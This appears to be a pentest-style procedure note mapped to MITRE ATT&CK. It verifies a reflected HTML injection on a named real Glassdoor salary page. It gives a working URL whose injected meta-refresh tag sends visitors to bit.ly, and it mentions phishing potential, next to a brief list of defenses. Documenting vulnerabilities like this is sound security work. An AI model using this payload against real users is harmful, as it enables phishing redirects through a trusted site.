---
tags:
  - xss
  - redirect
  - verification
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:55:38.450Z'
sub_techniques: []
id: d99404d3-7df2-46d5-ab2c-0ed99e5d5341
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Observe-Redirect-from-Injected-Meta-Tag

## Summary

This procedure verifies the success of HTML injection by loading the vulnerable URL and observing the automatic redirection caused by the injected meta refresh tag, confirming control over page behavior.

## Description

After injecting the payload, this step inspects the page source and monitors browser navigation to validate the vulnerability. It highlights the reflected nature of the XSS, where the payload executes immediately upon page load, useful for assessing phishing potential.

## Requirements

1. Successful completion of prior injection step
2. Web browser with developer tools enabled
3. Access to the injected URL

## Defense

Defensive measures and detection strategies:

- Log all reflected parameters and scan for meta tag anomalies
- Use client-side CSP to block inline script execution
- Alert on unexpected redirects from search parameters

## Objectives

1. Confirm injection in page source
2. Validate redirection functionality
3. Identify any partial mitigations

## Instructions

### Step 1: Load the Vulnerable URL

**Context**: Access the URL to trigger the payload.

Open the URL in your browser:

```url
https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115
```

> The browser should redirect to https://bit.ly within 0 seconds.

### Step 2: Inspect Page Source

**Context**: Verify the injection by viewing source.

Right-click and select "View Page Source" or use F12 developer tools.

> Look for the injected `<meta http-equiv="refresh" content="0; url=//bit.ly">` tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]
- [[tools/Chrome]]

## Tags

- [[xss]]
- [[redirect]]
- [[verification]]
